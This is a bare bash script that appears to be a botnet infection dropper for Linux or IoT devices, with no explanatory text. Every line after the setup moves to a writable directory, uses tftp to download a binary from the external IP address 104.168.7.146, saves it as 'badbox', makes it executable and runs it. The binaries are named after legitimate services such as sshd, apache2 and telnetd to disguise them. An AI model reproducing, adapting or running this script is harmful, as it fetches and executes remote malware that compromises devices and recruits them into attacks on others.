#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privntpd1 -g 104.168.7.146;cat privntpd1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privsshd1 -g 104.168.7.146;cat privsshd1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privopenssh1 -g 104.168.7.146;cat privopenssh1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privbash1 -g 104.168.7.146;cat privbash1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privtftp1 -g 104.168.7.146;cat privtftp1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privwget1 -g 104.168.7.146;cat privwget1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privcron1 -g 104.168.7.146;cat privcron1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privftp1 -g 104.168.7.146;cat privftp1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privpftp1 -g 104.168.7.146;cat privpftp1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privsh1 -g 104.168.7.146;cat privsh1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privnut1 -g 104.168.7.146;cat privnut1 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privapache21 -g 104.168.7.146;cat privapache21 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privtelnetd1 -g 104.168.7.146;cat privtelnetd1 >badbox;chmod +x *;./badbox
